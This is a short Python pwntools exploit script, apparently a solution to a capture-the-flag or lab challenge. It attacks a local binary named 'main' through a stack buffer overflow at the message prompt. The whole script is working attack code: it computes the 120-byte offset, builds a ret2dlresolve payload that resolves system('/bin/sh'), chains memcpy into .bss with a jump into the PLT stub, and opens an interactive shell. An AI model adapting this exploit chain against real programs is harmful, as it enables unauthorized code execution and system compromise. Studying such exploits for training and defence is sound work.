#!/usr/bin/env python3
from pwn import *

# ── 1) Pwntools Boilerplate ───────────────────────────────────────────────────
context(os='linux', arch='amd64', log_level='debug')
elf = ELF('./main')
p   = process(elf.path)

# ── 2) Writable slots & offsets ──────────────────────────────────────────────
DATA_ADDR   = elf.symbols['data']           # where std::cin.getline writes your input
BSS_ADDR    = elf.bss() + 0x200             # scratch space for fake relo (must be qword-aligned)
BUF_SIZE    = 112
SAVED_RBP   = 8
OFFSET      = BUF_SIZE + SAVED_RBP          # =120

# ── 3) Build our ret2dlresolve payload ──────────────────────────────────────
resolver = Ret2dlresolvePayload(
    elf,
    symbol="system",
    args=["/bin/sh"],
    data_addr=BSS_ADDR                       # force the fake .rela/.sym/.str into .bss
)

# ── 4) ROP chain: memcpy(bss, data, payload_size) → plt0+6(reloc_off) ────────
rop = ROP(elf)
rop.call(elf.plt['memcpy'], [     # copy fake-relo payload from DATA_ADDR → BSS_ADDR
    BSS_ADDR,
    DATA_ADDR,
    resolver.payload_size
])
plt0 = elf.get_section_by_name('.plt').header.sh_addr
# jump into the PLT0 stub with our relocation offset
rop.raw([ plt0 + 6, resolver.reloc_offset ])

chain = rop.chain()

# ── 5) Build the final “message” buffer ──────────────────────────────────────
#  ⋅ first, the raw resolver.payload bytes (we’ll memcpy these into BSS)
#  ⋅ pad so that our ROP chain lands at the saved‐RIP slot (OFFSET bytes)
#  ⋅ then the ROP chain itself
payload = flat(
    resolver.payload,
    b"A" * (OFFSET - len(resolver.payload)),
    chain
)

# ── 6) Send the exploit ──────────────────────────────────────────────────────
p.sendlineafter(b"Choose an option:", b"1")        # 1) View Account Statement
p.sendlineafter(b"Enter a message:", payload)      # overflow & trigger ROP

# boom → shell
p.interactive()
